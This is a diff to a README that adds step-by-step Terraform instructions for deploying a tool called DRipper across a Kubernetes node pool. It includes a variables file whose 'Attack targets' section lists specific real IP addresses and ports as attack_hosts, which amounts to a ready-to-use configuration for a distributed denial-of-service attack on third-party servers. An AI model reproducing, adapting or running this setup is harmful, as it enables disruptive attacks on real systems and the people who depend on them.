@@ -5,6 +5,36 @@ DRipper batch deploy on Kubernetes via Terraform
 
 I'm assuming you already have a Kubernetes cluster running somewhere, if not - get one!
 
+You need to create a `provider.tf`:
+```terraform
+provider "kubernetes" {
+  config_path = "~/.kube/config"
+}
+```
+
+Copy [variables.tf](variables.tf) to your folder.
+
+Create `terraform.tfvars`:
+```terraform
+######################################################################################################
+# Kubernetes
+######################################################################################################
+vcpus_per_node = 4
+memory_per_node = 16
+node_pool_size = 5
+
+######################################################################################################
+# Attack targets
+######################################################################################################
+attack_hosts = [
+  "217.12.104.100,80,100,http",
+  "92.38.145.145,80,100,http",
+  "92.38.145.145,443,100,http",
+  "92.38.145.145,444,100,http"
+]
+```
+
+Then create `main.tf` with the following content:
 ```terraform
 module "ripper_deployment" {
   source = "./modules/v1_deployment"
